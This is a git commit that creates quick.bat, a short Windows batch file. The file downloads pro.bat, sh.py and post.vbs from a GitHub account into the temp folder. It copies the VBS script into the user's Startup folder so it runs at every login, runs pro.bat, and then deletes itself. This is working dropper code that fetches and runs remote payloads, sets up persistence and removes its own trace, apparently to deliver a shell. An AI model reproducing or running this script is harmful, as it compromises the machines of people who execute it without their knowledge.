b590b593e3e2e079591d319ba85b1c3e174cee19
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 06:17:01 +0300

    Create quick.bat

---
+++ quick.bat
@@ -0,0 +1,7 @@
+@echo off
+curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
+curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
+curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
+move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+call %temp%\pro.bat
+del "%~f0"
